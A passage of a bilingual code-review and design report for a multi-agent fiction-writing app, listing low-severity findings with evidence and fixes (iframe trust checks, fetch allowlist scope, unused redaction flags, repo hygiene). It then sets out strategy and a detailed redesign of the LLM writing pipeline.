**问题**：The audit trail the outbox was designed to surface (per its own doc comment) is collected and immediately invisible; meanwhile it adds two more pieces of card-shell state to the composition root (compounding the accretion problem) and a reactive tick that triggers nothing.

**建议**：Either wire shellVarAudit.list() into InspectorDrawer/CardShellFloatingStatus as intended, or delete the buffer and tick until the debug surface exists. If kept, move it into the future useCardShellSurfaces composable.

### C9. [低 / 前端架构] inst:-prefixed shell variable writes change behavior based on campaign instance count

**证据**：frontend/src/AppV2.vue:261-263: onShellVarWrite resolves instanceId as "first instance if map has exactly one; else null". frontend/src/utils/shellVariableOutbox.js:59-68,75-80: a two-part 'inst:<key>' write uses that instanceId for instance scope, and fails with 'instance scope requires instanceId' when it is null.

**问题**：The same card writing 'inst:hp' succeeds (instance-scoped) while a Campaign has one character, then silently starts failing the moment a second CharacterInstance is created — write behavior keyed to unrelated campaign membership. This also sits against the project's normalization rule (names/references resolved to stable instance ids) by substituting a cardinality heuristic for an actual resolution.

**建议**：Drop the map-size heuristic: resolve the target from the shell's bound character (cardShellCharacterId → its instance id via instanceNameMap) or require the explicit 'instance:<id>:<key>' form, logging a clear rejection for ambiguous 'inst:' writes.

### C10. [低 / 安全架构] `CardShellHost` trust check degrades to a value embedded in the untrusted document; `PluginHost`'s does not

**证据**：`frontend/src/components/CardShellHost.vue:948-955`: `isTrustedSource: (event) => { try { if (iframeRef.value?.contentWindow && event.source === iframeRef.value.contentWindow) return true } catch (_) {}; return !!(event?.data && event.data.pluginId === shellPluginId) }`. Compare `frontend/src/components/PluginHost.vue:207-209`: `return !!iframeRef.value?.contentWindow && event.source === iframeRef.value.contentWindow` — no fallback. The `__sf_shell_bridge` path is session-gated (`cardShellDocument.js:191-198`) but the `MSG_REQUEST` path at `CardShellHost.vue:825-828` checks only `d.pluginId === shellPluginId` before handing off.

**问题**：`shellPluginId` is injected into the shell document itself (`plugin-bridge.js:1457`, `window.storyforge.pluginId`), so the fallback authenticates a message using a secret the adversary is handed by construction. Today the practical impact is small — any frame that knows the id is a frame the card created, i.e. the same adversary, and the strict `event.source` branch succeeds in the normal case so the fallback rarely fires. But it makes the sender check optional in a security-relevant handler and diverges from the sibling component for no stated reason, so a future change (e.g. moving the shell to a nested frame) would silently rely on the weak branch.

**建议**：Delete the `event.data.pluginId` fallback and match `PluginHost.isTrustedPluginSource` exactly. If some load path genuinely produces a mismatched `event.source`, fix that path instead and add a comment; a one-line regression test asserting a message from an unrelated window is dropped would pin the behavior.

### C11. [低 / 安全架构] `ExportOptions.redact_character` and `redact_connection` are declared but never read

**证据**：`crates/app-logging/src/lib.rs:386-391` declares `ExportOptions { redact_content, redact_character, redact_connection }`; grepping the workspace for `redact_character`/`redact_connection` returns only those two declaration lines — `export_bundle` (`:393-450`) branches on `opts.redact_content` alone. `crates/tauri-app/src/lib.rs:6634-6641` (`log_export_bundle`) wires only `redact_content` and fills the rest with `..Default::default()`.

**问题**：A redaction knob that exists in the type but has no effect is a quiet trap: a future caller (or a support workflow that says "export with character redaction on") will set the flag, read the field name, and ship a bundle that still contains full character cards and connection names. `connection_name` is emitted even on the redacted path (`LlmCallDetailRedacted.connection_name`, `:100`), which is exactly what `redact_connection` was presumably meant to suppress. Nothing leaks today because nothing sets them, so this is hygiene rather than an active leak.

**建议**：Either implement the two branches in `export_bundle` (strip character/world-info payloads; blank `connection_name`) and expose them through `log_export_bundle`, or delete both fields from `ExportOptions` so the struct stops advertising a control it does not have.

### C12. [低 / 产品意图符合度与范围纪律] Default fetch allowlist includes entire code-hosting domains, making 'allowlist' mediation nearly vacuous for scripts

**证据**：crates/tauri-app/src/card_shell_cache.rs:32-47: default_allowed_hosts() contains cdn.jsdelivr.net, testingcf.jsdelivr.net, raw.githubusercontent.com, github.com, gitee.com — i.e., any file any user has ever published on GitHub/Gitee/jsdelivr is fetchable by any card through the host proxy (frontend/src/utils/cardShellFetchProxy.js:55-64 routes all https fetches to the host).

**问题**：The hard constraint "远程资源宿主代持（allowlist + 缓存）" is met mechanically — the host controls, caches, and can log every fetch, and the payload executes only inside an opaque-origin sandboxed iframe, which bounds the blast radius. But host-granular allowlisting of whole code-hosting platforms means the allowlist does not meaningfully constrain which code a malicious or compromised card can pull; the real security boundary is solely the iframe sandbox. The docs' framing suggests the allowlist is a second defense layer; today it mostly is not.

**建议**：Keep the CDN hosts but narrow the code-host entries to path prefixes actually used by the gold card (e.g., raw.githubusercontent.com/<org>/<repo>/), or move allowlisting to per-card manifest scope so each card declares its origins at import time and the user approves once — matching the ST-compat-layer design already sketched in PRODUCT-REVIEW §4.4 ("CDN 白名单 + 用户授权 UI").

### C13. [低 / 产品意图符合度与范围纪律] One-off patch scripts and third-party card assets with unresolved licensing sitting untracked in the repo root

**证据**：git status untracked: _patch_card_shell_utf8.py (root), scripts/_fix_shell_module_store.py, _fix_shell_render.py, _fix_shell_render2.py, _fix_shell_th_ready.py, _fix_th_zod_v4.py, _wire_shell_plugin_bridge.py (all dated 2026-07-22/23, 5-25KB each — one-shot source-patching scripts from the shell sprint), plus 写卡知识库.json, 明月秋青-V10086.json, 明月秋青写卡预设-标准+辅食.json, 明月小说文风蒸馏总结工具.zip in the repo root. CARD-STUDIO-FEASIBILITY-2026-07-22.md §9 itself flags 授权与署名 (licensing/attribution) as an open risk for exactly these assets.

**问题**：The seven Python scripts are spent ammunition — they patched source files that have since diverged; rerunning any of them would corrupt current code. The third-party prompt-pack assets have an explicitly unresolved licensing question per the project's own feasibility doc, yet sit one 'git add -A' away from being permanently committed to history (the repo pushes to a self-hosted Gitea, but history rewrites are still costly). Neither belongs in the working tree of the product repo.

**建议**：Delete the seven _fix/_patch scripts (their effect is already in the committed diffs), and move the four card assets out of the repo (e.g., a local assets/ dir covered by .gitignore, or the planned assets/cardstudio/ location only after the Phase 0 licensing/attribution decision the feasibility doc requires). Add scripts/_*.py and the root-level *.json card files to .gitignore until then.

### C14. [低 / 工程健康与规模上限] Untracked 266KB println-only 'test' compiled by every workspace test run with zero assertions

**证据**：crates/infra-regex/tests/compile_test_card_display.rs — 266,216 bytes, exactly 1 #[test] (compile_test_card_display_scripts), 23 println! calls, 0 asserts; each script result is printed as 'OK script_N' or 'FAIL script_N' but the test passes either way. Untracked ('?? crates/infra-regex/tests/' in git status) yet located where cargo test --workspace compiles and runs it. The file embeds a third-party card's entire status-bar HTML/CSS/JS as string literals.

**问题**：Pure cost with zero signal: rustc must parse/typecheck a quarter-megabyte of string literals on every workspace test run, and the test can never fail, so a regex regression it was written to investigate would pass silently. It is also one `git add .` away from committing a full third-party card's frontend into the repo history.

**建议**：Delete it, or reduce it to a handful of real assertions (expected output snippets for the 2-3 regexes that actually regressed) and commit that; if the println exploration is still useful, move it to an #[ignore]d test or an examples/ binary.

### C15. [低 / 工程健康与规模上限] Repo-root hygiene: 7 applied one-shot codemods, unignored user card assets, and a live git worktree not in .gitignore

**证据**：Untracked in git status: _patch_card_shell_utf8.py (repo root), scripts/_fix_shell_module_store.py, _fix_shell_render.py, _fix_shell_render2.py, _fix_shell_th_ready.py, _fix_th_zod_v4.py, _wire_shell_plugin_bridge.py; 4 Chinese card/knowledge JSON/zip assets at root (写卡知识库.json, 明月秋青-V10086.json, ...) while 3 earlier ones are gitignored by exact filename (.gitignore:41-44) and hashed Vite output filenames (index-CKkCfkuN.js etc.) are pasted into .gitignore one by one; .worktrees/ is a live worktree (git worktree list: feat/card-studio-phase1 @ a6fc41b) and `git check-ignore .worktrees` reports NOT_IGNORED.

**问题**：The per-filename ignore accretion shows the pattern will recur with every new card asset. `git add .` in this state stages already-applied codemods (which will actively mislead a later reader into thinking they are pending migrations), personal creative-writing card content, and an embedded-repo gitlink for the worktree. None of this blocks a release gate today (secret scan covers untracked inputs), but it steadily raises the cost of knowing what the repo actually contains.

**建议**：Add `.worktrees/`, `scripts/_*.py`, `_*.py`, `*.zip`, and a `cards/` directory pattern (moving root card assets there) to .gitignore; delete the applied codemods; replace the hashed-filename ignore entries with the `frontend/dist/` rule that already exists.

### C16. [低 / 工程健康与规模上限] Active doc directories carry 91 markdown files; completed PLAN/RESULT pairs are not archived despite a working archive convention

**证据**：docs/workstreams/ = 58 files, of which 24 match *PLAN* and 22 match *RESULT* (mostly completed pairs: RELEASE-BRONZE, SQLITE-*, M5-*, NIGHTLY-INTEGRATION, ...); docs/*.md = 33 files including 5 active root PLAN-*.md; docs/archive/ exists with 7 dated subdirectories and DOCS-CODE-AUDIT.md's 2026-07-08 entry shows the archive discipline was applied to root plans — but never to workstreams. Required reading alone is 1,372 lines across 6 files before any workstream doc.

**问题**：The doc system is the project's agent-memory architecture, and its value depends on an agent being able to find the 3-4 live documents quickly. Four dozen completed PLAN/RESULT pairs sitting beside the live card-shell plan raise the per-session discovery cost and are a direct contributor to the drift in the high-severity docs finding: the more surface there is to sync, the less of it gets synced.

**建议**：Sweep completed PLAN/RESULT pairs into docs/archive/2026-07-completed-workstreams/ (the convention already exists) and keep a one-screen docs/workstreams/README listing only live workstreams with their actual HEAD state.

### C17. [低 / 工程健康与规模上限] World-info vector writes discard persistence errors with `let _ =`, contradicting the project's own storage-error-propagation discipline

**证据**：crates/tauri-app/src/lib.rs:1060 and :1280 — `let _ = state.vector_store.upsert(VectorRecord {...})` for green-light worldbook entries (also :1053 for delete). By contrast the same file logs upsert failure for summary embeddings (:3713 `if let Err(e) = vector_store.upsert...`), and docs/DOCS-CODE-AUDIT.md explicitly celebrates that 'CampaignStore 写入 API 已返回 Result' with structured error propagation.

**问题**：If persist_records fails (disk full, permission), the in-memory record survives the session but is silently absent after restart — search_vectors quietly stops recalling worldbook entries with no log line to explain why, an especially confusing failure given the project's otherwise deliberate storage-error observability.

**建议**：Match the :3713 pattern: log a warning with entry key/count on upsert/delete failure. Two-line change per site.

### C18. [低 / 工程健康与规模上限] Frontend ships one 633KB main chunk; the known dynamic/static import conflict is recorded but unaddressed

**证据**：frontend/dist/assets/index-xqlESxBR.js = 633,356 bytes (next largest chunk 8.4KB — effectively no code splitting); RELEASE-CHECKLIST.md repeatedly notes '保留既有 Vite dynamic/static import warning ... 按分包风险记录' (2026-07-14 and 2026-07-07 entries), which is the exact Vite warning that defeats chunk splitting when a module is both statically and dynamically imported.

**问题**：On desktop Tauri this is negligible; on the stated Android-first target a single 633KB parse on a mid-range WebView adds cold-start latency, and the monolithic chunk means every screen pays for Meta/debug/power-mode code the writing surface never uses. Risk is low today but the checklist has been carrying the warning as 'recorded, not fixed' for three weeks while the chunk grew past its previously measured size.

**建议**：Spend one session resolving the dual-import warnings (make Meta/power-mode screens purely dynamic imports) so Vite's route-level splitting actually engages; verify on an Android build since that is the platform the decision serves.

---

## 评审方法与边界

- 评审执行于 2026-07-26，基于 main @ d36d433 + 当时的未提交工作树。
- 7 个维度分析 agent（后端分层 / 数据一致性 / 流水线 / 前端 / 安全 / 产品符合度 / 工程健康）全量读代码，共产出 65 条发现（8 高 / 39 中 / 18 低）。
- 8 条最重要发现各由 1 个独立 agent 对抗核实：默认立场是驳倒该发现，逐行验证引用；结果 7 确认、1 部分确认、0 驳回。
- 本报告**只记录、未改任何代码**；修复应按 P0→P1→P2 顺序另行立项，每项遵循项目既有的"一阶段一提交 + 指定测试"纪律。
- 本文件不是 DOCS-CODE-AUDIT.md 的替代；若按建议执行修复，应同步回写该审计与 CLAUDE.md 的相应事实（尤其 V2 涉及的 Phase 6 条目）。

---

## 2026-07-26 补记一：整体战略判断（超出代码审查的项目级看法）

> 本节与补记二来自评审后的整体讨论，是判断与建议，不是核实过的代码事实。

### 1. 这是三个项目共用一个仓库，而产能只有一份

- **产品内核**：Campaign-first 多 Agent 写作引擎（信息隔离 + 状态闭环 + 可解释可修复）——有独创性的产品。
- **研究项目**：Chronicle 记忆金字塔 / epoch 冻结 / 知识传播封口。MEMORY-CONTEXT-COMPILER-SPEC 的思考深度是研究级的。
- **兼容工程**：ST 导入、正则/宏引擎、插件桥、TavernHelper 仿真、card shell 运行时——近一个月事实上吞掉了前两者的产能。

三者的成功判据互相冲突（收口发布 vs 长期迭代 vs 无底洞），当前三线并进外加 SQLite 迁移与 Card Studio 第四、第五条线，对单人 + AI agent 执行模型不可持续。**项目最需要优化的不是架构，是方向选择的纪律。**

### 2. 核心资产与未被证明的前提

相对 ST 及同类前端的唯一不可复制差异是**多 Agent 信息隔离 + 状态闭环**。但该护城河的价值至今未被证明为"读者可感"：harness 测的全是工程正确性（一致性、接受率、隔离探针），没有任何评测回答过"盲测下读者能否分辨多 Agent 流水线与单次调用的成文差异"。每回合 4+N 次 LLM 调用的成本真实付出，体验增量未测量。**这是当前信息价值最高、而没有做的一个实验。**

### 3. ST 兼容是引力井

INTENT 说"ST 卡是素材，不是产品形态"，但实际轨迹是为一张金标卡建起越来越完整的 ST 运行时仿真，特定卡的 URL 甚至进了 Rust 安全模块。每一步单独合理，合起来就是项目自己警告的"增量式变成第二个 SillyTavern"。原生路线的雏形已存在（MvuStatusBar + 变量 schema 即"状态栏体验"的原生路径）。建议把 card shell 重新定位为**展示适配器**（开场 + 状态栏只读场景，到此为止），交互能力用原生 Campaign 机制重建，并在第二张卡到来之前写一页边界政策。

### 4. "广度 80%"综合征

Roadmap 上多个 Phase"已完成"，但逐层看大量功能停在 80% 深度（知识传播文本匹配级、压缩质量未标定、M5 45/100、GUI/Android 未验收）。Phase 7（收口发布）被反复插队。没有外部用户压力时，"完成"的定义退化成"证据文档写完"而不是"有人在用"；91 个活跃 md 的过程重量已开始拖慢执行（权威文档漂移 = AI agent 工作记忆污染）。

### 5. 建议的方向序（决策优先于代码）

1. **先做盲测实验**（多 Agent vs 单调用，同状态同意图，盲评 20-30 组）——结果决定一切后续投入的正当性。
2. **发 Bronze 给 5-10 个真实用户**（先修完 P0，尤其 fsync 与两个数据丢失 bug）；用真实使用回答 Android 有多急、卡壳做多深、Card Studio 是否伪需求。
3. **给 ST 兼容定天花板**：展示适配器政策；停止向通用层加卡特例。
4. **结束双后端中间态**：SQLite 专项推到默认，或冻结 opt-in 停止双维护；"两套 Accept 状态机各自演化"是最贵的状态。
5. **为 AI 可读性优化代码形态**：本仓库的主要读者是 AI agent，21k 行 lib.rs 对上下文窗口有敌意；拆分、事实生成化、约定 lint 化是执行模型的吞吐量优化。
6. **文档减负**：权威文档收敛到 ~5 个活文档，完成的 PLAN/RESULT 立即归档。

**一句话**：项目不需要"更好的架构"，需要从"能力建设模式"切换到"交付验证模式"——先证明护城河可感，再发给真人，用真实反馈替代内部证据文化来排序。

---

## 2026-07-26 补记二：写作流水线设计评述

> 结论：管线的**工程**一流，管线的**戏剧学**有一个结构性缺陷，管线的**经济学**还没被认真对待。

### 1. 做对了的（不要动）

- **信息隔离是架构诚实**：单模型无法可靠 prompt 出"不泄密"；独立 Subagent + `knowledge_for_instance` + 工具层硬拦越权（对抗探针实测拦截成功）是结构性保证。
- **状态闭环与生成解耦干净**：postprocess best-effort、不阻断成文、Skipped/Failed 区分清楚。
- ScenePlan 的 conflict / must_not_resolve / exit_hook 是真正的编剧学知识编码（"这场戏不许解决什么"比"要发生什么"更重要）。
- 取消/流式/事件/溯源等管线工程是生产级的。

### 2. 结构性缺陷：平行独白不是戏

N 个 Subagent **互相看不见地**各写独白，Editor 事后缝合成"交互"。但戏剧本质是回合制的相互反应；当前系统里最难的创作任务（把不交互的素材捏出交互感）落在最弱势的 Agent（无工具、无重演权的 Editor）身上。**角色的知识隔离得很好，但角色之间的化学反应从未真正发生过。**

隔离还画错了一条线：把"我知道什么"（认知隔离，应该隔）和"我们此刻共同面对什么"（场面状态，不该隔）混在一起——Subagent 连本轮物理现场都不共享，两人同抓一把剑这类冲突只能靠 QualityGate 事后兜。

修法递进，不需要推翻架构：

1. **共享场面块**：Director 产出所有 Subagent 可见的 scene-state（站位/在场事件/公开动作），知识照旧隔离。改动最小。
2. **顺序可见执行**：Director 排发言顺序，后演者可见本轮先演者的表演。调用数不变，换真实反应链，代价是串行延迟。
3. **对手戏合并调用**：多数场景是双人戏；两角色一次调用双 persona 同演，隔离用**两者知识集合的交集**保证——现有知识模型直接可计算，最值得实验。

### 3. 经济学缺陷：每一轮都在为重头戏付费

全流水线 4+N 次调用，但 RP 多数轮次是小节拍。流水线捆绑了两个正交价值：**状态机器**（便宜、每轮都值、护城河）与**多 Agent 生成**（昂贵、只在重场戏值得）。postprocess 不在乎草稿是谁写的——应解耦为：

- **日常档**：Campaign-aware 单笔者模式（一次调用 + 全部状态注入 + 照常 postprocess/quality gate）；
- **重场戏档**：全流水线（用户显式触发或廉价意图分类路由）。

这对 Android 目标几乎是必需的。另外 Director 身兼簿记（查 chronicle/任务/变量）与戏剧策划两职；context compiler 成熟后应吃掉簿记，让 Director 收缩成纯策划。

### 4. 角色的"想要"无人负责

`current_desire / ongoing_action / emotion_stage` 每轮由 Director 现编；角色持久状态里有 HP、关系、知识，唯独没有"我正在图谋什么"。建议把**角色议程（当前意图）**设为 instance 一等状态（变量机制可承载），postprocess 更新、Director 只能引用调整——小改动，对"角色像连续的人"贡献极大。

### 5. 检验全部判断的单个实验

四臂盲测：单笔者带 Campaign 状态 / 当前平行流水线 / 顺序可见流水线 / 对手戏合并。同一 Campaign 状态与意图，盲评成文质量与对话交互感。可复用 harness 现有三臂 CoT 评测骨架（phase_b_matrix / budget / evidence）。同时回答"多 Agent 值不值"与"交互缺陷是不是真的"。

---

## 2026-07-26 补记三：写作流水线重设计（完整设计讨论定稿）

> 来源：补记二之后的多轮设计对话（产品经理视角起步，经五组质询逐层修订）。
> 状态：**原始设计定稿；2026-07-27 写作流水线 V2 已收口**。Summarizer / PostProcessor 已拆成独立职责，回合小票位于 Accept 之前，Sequential Crew 是群像主路径；四臂真实生成、异模型子代理盲评试点与 Sequential Crew 真实后缀恢复验收均已完成。详见 [WRITING-PIPELINE-V2-IMPLEMENTATION-2026-07-27.md](WRITING-PIPELINE-V2-IMPLEMENTATION-2026-07-27.md) 与 [BLIND-AB-PIPELINE-RESULT.md](BLIND-AB-PIPELINE-RESULT.md)。多意图、多 seed 和双角色 Duet cohort 属于 V2.1 质量标定。
> 阅读提示：本节是自洽的设计规格草案，与补记二的"评述"不同，可直接作为后续 PLAN 的母本。

### 1. 设计起点：回合契约

不从 Agent 拓扑出发，从"一轮是什么体验"出发。用户感知的只有四样：等了多久、花了多少钱、写得好不好、世界记不记得。据此定义每轮无条件承诺的**回合契约**：

1. **状态被读了**：角色知道其应知的（知识/变量/伏笔进上下文）；
2. **状态被写了**：本轮事件进档案，下轮生效；失败必须有脸（"这轮没记进档案 [重试]"），绝不静默；
3. **可反悔**：变体/重演/编辑永远便宜可用；
4. **可追问**：任何一句正文能回答"为什么这么写"（溯源已有，缺入口）。

契约不要求多 Agent——**状态闭环是每轮必给的承诺，多 Agent 只是某些档位的实现手段**。这是全部设计的解绑基点。配套体验预算：日常档首字 <3s、全文 <30s；重场戏 1–3 分钟但过程可视 + 可离开；每档事前显示预估成本（用户自带 key）。

### 2. 三档生成模式

| 档位 | 场景 | 实现 | 调用成本 |
| --- | --- | --- | --- |
| 续写 | 小节拍、日常推进（约 80% 轮次） | 单笔者 + 全量状态注入 + 独立记账（§9） | 1 贵 + 1 廉 |
| 对手戏 | 两人交锋 | 场记 + 按拍交替续演（§5） | 3–5 |
| 大场面 | 群像/摊牌/章节高潮 | 完整流水线 + 用户可编辑的场景卡 | 4+N |

### 3. 路由

分层：用户显式选择永远最高且被记住 → 确定性规则默认路由（在场角色数、**在场者间是否存在分歧的私密知识**、临近触发任务、emotion_stage、意图祈使强度）→ 规则不确定时才用小分类调用，绝不用完整 Director 路由。三条纪律：路由结果可见可改（"本轮：续写 · 点击升档"）；选错便宜地改（升档重 roll 一步）；费用不许意外（超阈值升档需确认）。**防全知需求本身是路由信号**：秘密攸关 → 建议结构隔离档。

### 4. 五组质询确立的设计决策

1. **场景卡 vs 现有 trace**：用户今天已能看到 Director 输出（ProcessTimeline/溯源），但那是事中观察。场景卡的增量 = 事前（开拍前检查点）、可编辑（输入而非日志）、有约束力（用户改过的 must_not_resolve 进 NarrativeContract/QualityGate 成为有牙齿的合同）。仅大场面档出现。
2. **对手戏 vs 续写的差距**：认知隔离是否真实存在（续写档一个模型持有全部知识，防泄漏只靠嘱咐）、声音独立性（叙述者写角色 vs 角色各自说话）、真实不可预期（A 说话时 B 的反应尚不存在）。诚实承认：无秘密的日常斗嘴强模型单调用能逼近——所以它是档位不是默认，且这正是盲测要测的。
3. **单笔者档的防全知**：从结构保证降级为软保证，三层兜——入口（归属标注的编译产物）、出口（QualityGate 泄漏窗口，与生成方式无关）、升档建议（秘密承重 → 推荐隔离档）。与 ST 的差距在三明治不在生成调用：编译进什么 / 门禁出什么 / 写回什么 / 能否解释，四项 ST 全无。
4. **场景卡不解决"平行独白不是戏"**：病根在执行层（Subagent 互相看不见），场景卡在计划层。但它是执行层改造的方向盘——发言顺序、配对、反应链节拍恰是顺序可见/对手戏执行需要的输入。两者是一对。
5. **隔离画错的一条线**："我知道什么"（认知，该隔）与"我们此刻共同面对什么"（场面状态，不该隔）要分开；所有执行者共享场面块，知识照旧隔离。

### 5. 对手戏调用流程（共享片场记录 + 按拍交替续演）

核心结构：**场记**——本轮内增长的文本，只含已表演出的言行（narrative + dialogue），**永不含 inner_thoughts**（Performance 三字段现成，剥离零成本）。用户输入是第 0 拍。

```text
第 0 步（零调用）搭台：演员表（意图点名 + 上一场面在场者，>3 人升大场面）、
  场面块、拍数预算（默认 3）、开场者（被点名者，否则议程压力最大者）——全部确定性规则
第 1 拍（调用 1）A 开场：system=A 的 persona/behavior/常驻书（build_campaign_subagent_system 原样）；
  tail=场面块 + A 的隔离知识/变量/议程 + 场记 + 指令（只写 A 的言行，写到交棒点，可发 scene_close）
第 2 拍（调用 2）B 接戏：B 看到的是 A 表演出的行为，不是 A 的知识——信息只通过舞台言行传播
第 3 拍（调用 3）A 升级/收束：system+history 与调用 1 相同（命中自己的 KV 前缀），场记多两拍
第 4 步（调用 4）定稿 Editor-lite：只做誊写（衔接/视角/节奏），
  「不得发明场记中不存在的事件或台词」进 QualityGate——定稿是排版不是编剧
```

对接现状：事件流复用 SubagentStarted/Progress/Done（用户实时看两人一拍拍交锋，即最好的过程可视化）；重演 = 从第 k 拍截断重放（落在 PartialRollTarget::Subagent 语义）；溯源每拍一个 SubagentSnapshot；postprocess 拿分拍场记，ToldByOther 归属显式化反而更准。承重秘密由 NarrativeContract redaction 平移到"拍落场记前"。降级：某拍两次失败 → 提前收场定稿已有拍。真实多回合乒乓（每拍一句、6+ 调用）不做默认。**新代码只有 run_duet 编排函数与定稿 prompt，基础设施零新增。**

### 6. 续写档提示词构成

前提纠正：不是"没有导演"，而是导演四职能拆解——检索簿记 → 确定性编译；选角 → 规则（全名册一行/人永远注入，预期在场者才给全档案，登场角色下轮自动升格）；每轮戏剧策划 → 删除（小节拍不需要开会）；角色简报 → 结构化注入（不经 LLM 转述）。

三段布局（MessageLayout 纪律不变）：

- **System（稳定前缀）**：执笔者角色指令（"你不是任何角色，你如实扮演所有在场角色；归属标注是硬边界"）+ prompt 模块 + 叙事契约常量 + 常驻蓝灯书。
- **History**：chronicle 概览/纪要带前缀 + epoch 近窗（recent_history_with_epoch 原样）。
- **Tail**：场面块 / 在场角色档案（persona 摘要 + behavior + **议程** + **归属标注知识**（"[仅他知道·秘密]…"）+ 关键变量，上限 3 人全档案）/ **认知边界块**（仅秘密分歧时生成）/ 未了线索 / 触发绿灯书 / 远记忆召回 / 近期纪要 / 用户意图 / 输出契约。

**标注即门禁输入**：归属标注、路由判断、QualityGate 泄漏窗口三处同源同一份"谁知道什么"数据。默认无工具（检索前置到编译，见 §8）。新代码仅三样：执笔者指令、标注渲染格式、边界块生成规则——其余是 build_director_tail / build_campaign_subagent_* 的重组。**续写档 = context compiler 的第一个完整客户；三档共享一个编译器，差异只在编译产物喂给几个执行者。**

### 7. 三个正确性问题的回答

1. **确定性编译怎么保证正确**：Director 检索今天也不保证正确（LLM 猜测、漏查静默、不可复现）。确定性把正确性从玄学变成工程属性：编译产物可审计（每块带来源注记）、可离线评测（对已采纳轮次回放检查"成文引用的实体是否在当轮编译产物中"——编译召回率成为数字，Director 模式永远给不出）、错误修一次全轮受益。逃生阀：意图中的陌生专有名词 → 自动补检索或建议升档。选角错了便宜地改（UI 一键编辑在场者，被记住）。
2. **认知边界从哪来**：无知不可枚举，分歧可计算。账本正向记录谁知道什么（postprocess 写入、门禁校验、传播链溯源——机制现存），"X 不知道 F"是集合差，编译器算，零人工。**推导必须保守**：只对"F 有持有者、且标记 Private（或可溯源为 X 缺席场合的独家目击）、且 X 无匹配条目（含传话链检查）"的 F 断言无知；非秘密事实的账本缺失一律按常识处理，不生成边界——防止从不完备账本推出荒谬假边界。仲裁归 Meta（知识面板 + "他其实不知道这个"编辑动作）。
3. **思维链**：机制零改动可用（新 AgentRole::Writer 进 profile 体系，ReasoningMode Disabled/Prompted/Native 照常分流）。关键设计点：**被删的不是导演的思考，是导演的独立调用——戏剧策划迁移进执笔者的思维链**（清单式 CoT：①谁在场想要什么 ②张力点/不该解决什么 ③每个开口者知道/不知道什么 ④写到交棒点）。下游链就绪：reasoning_content 捕获进溯源（"为什么这么写"在无导演模式不丢失）、Reasoning 正则 placement 6 处理展示。Writer 的 Disabled/Prompted/Native 并入四臂盲测作一个维度。

### 8. 远端记忆召回的分层（经两轮修订的定稿）

前提：三条通道里只有"深度展开"依赖工具（目录常驻与 intent→hybrid top-3 自动召回本就是确定性的）。

| 层 | 机制 | 成本 | 覆盖 |
| --- | --- | --- | --- |
| 1 | 多路推测召回（意图 + 议程 + 任务 + exit_hook + 实体各发一路查询合并）+ **确定性目录匹配展开**（search→get 序列机械化：查询对目录 headline 索引匹配，高分条目在字节预算内自动展开） | 0 | 可预测关联（大头） |
| 2 | **检索轮**：廉价小调用只做选题（输入=意图+议程+headline 目录，输出=最多 3 个 code 或"不需要"）→ harness 确定性展开 → **干净执笔轮**（零工具脚手架） | +1 小调用 | 联想式关联；弱模型安全 |
| 3 | 真工具轮（强模型 profile 可选；配**上下文清洗**：最后一轮生成前把工具调用/结果轮压缩成【查证结果】块重建 messages——该技术对现有 Director 同样有价值） | 工具轮若干 | 强模型深查自由 |
| 4 | 指针纪律（目录里有但未注入的往事写到"提及"为止，宁薄勿编）+ "补记忆重写"按钮 | 兜底 | 前三层全漏的止损 |

两条修订来自质询：细节丢失靠第 1 层的目录匹配展开消灭（指针纪律降为最终护栏，不是防线）；**重 roll 是兜底不是设计**——每次"补记忆重写"被触发都计为缺陷信号进指标（记忆补写率，目标趋零），驱动编译规则修正。弱模型多轮工具退化的病根是"工具事务与写作同上下文"——检索轮结构性解决（办事员任务放进质量无关紧要的小调用，写作上下文纯净到底）。

### 9. 后处理与总结层重设计（"作者尾单"提出后被质询否决的最终版）

**现状骨架保留不动**：best-effort 解耦（Skipped≠Failed）、Accept 屏障（状态在采纳时原子落地，重 roll 不污染存档）、四路径分离（Summarizer/PostProcessor/Compressor/Archiver 各有节奏）——全项目最值得保留的设计之一。

**核心批评**：抽取层在昂贵地重新推断执笔者本来就知道的事（PostProcessor 半盲办案，V1/V2 两个数据丢失 bug 的病根都是"在场者"作为被推断的会话状态断线）。

**曾提出"作者尾单"（执笔调用尾部追加结构化台账）——被否决**，理由记录在案：向散文质量征税，且有隐性的**可报告性污染**（模型从第一个 token 起知道要交台账，会把正文写得便于上报——事实点名式叙述、显性化心理、少留潜台词）。判据升格：**提示词内容的准入测试 = 它改变正文吗？** 认知边界块通过（阻止泄密塑造正文），台账 schema 不通过。

**最终方案：干净执笔 + 全案卷差分审计**：

```text
执笔调用（圣域）：编译产物 → 正文。一字不加。
记账调用（独立、廉价模型、防抖预取）：
  输入 = 编译产物原样转交（场面/在场名册含 id/知识边界/议程）+ 意图 + 成文
       + [执笔者 reasoning_content，辅助证据，无它照常工作]
  输出 = 单次结构化：本轮小结（Chronicle A）+ 知识/变量/任务台账
  性质 = 差分审计（事前状态 vs 事后文本），不是盲侦探
```

- 在场者从推断状态变成转交数据（V1/V2 根治不靠尾单，靠编译产物传下去）；名字→id 解析几乎消失（名册带 id 转交）；归一化门禁全保留，从纠错主力退回校验哨兵。
- reasoning 是白捡的作者意图（思考反正要做），标注为辅助证据（忠实度有限）。
- **防抖预取**：草稿落定 N 秒未重 roll 才起跑，重 roll 即取消——消灭现状"每个废弃变体白付记账费"；Accept 保持即时原子（迟到 postprocess 守卫现成）。
- 记账走 model_override 廉价模型：**贵模型只写正文，便宜模型管一切文书**。
- **回合小票**：Accept 后展示状态变更 diff（"林如得知了 X · 陈默警惕 ↑ · 查账有进展"），逐条可否决（走 Meta patch 语义）；每次否决计为抽取缺陷信号。这也是"她记得"溯源徽章的数据源。
- Compressor/Archiver 不动；唯一的债是文档自认的"真实模型压缩质量未标定"——评测欠账非设计欠账。纪要保真度进四臂盲测采样项。

### 10. 本轮对话沉淀的四条设计法则

1. **执笔调用是圣域**：进入它的每个字必须服务正文，离开它的只有正文；一切事务（检索/选题/记账/校验）住在旁边的廉价调用里拿完整案卷各干各的。——统一了两段式检索、上下文清洗、记账分离三个结论；同时是质量策略（上下文纯净）、成本策略（贵模型只花刀刃）、正确性策略（结构化交接可测可审）。
2. **机器显式负责，LLM 在预算内思考，错误可见可修**：检索如此（编译器+逃生阀）、边界如此（集合差+保守规则+Meta 仲裁）、策划如此（思维链+溯源）。
3. **兜底即缺陷信号**：用户每次动用兜底（补记忆重写、小票否决、在场者编辑）都进指标、驱动系统修正——兜底存在的意义是收集它自己不该被用到的证据。
4. **同源数据多处复用**："谁知道什么"一份数据供入口标注、路由判断、出口门禁三处使用，不会互相打架。

### 11. 落地顺序建议

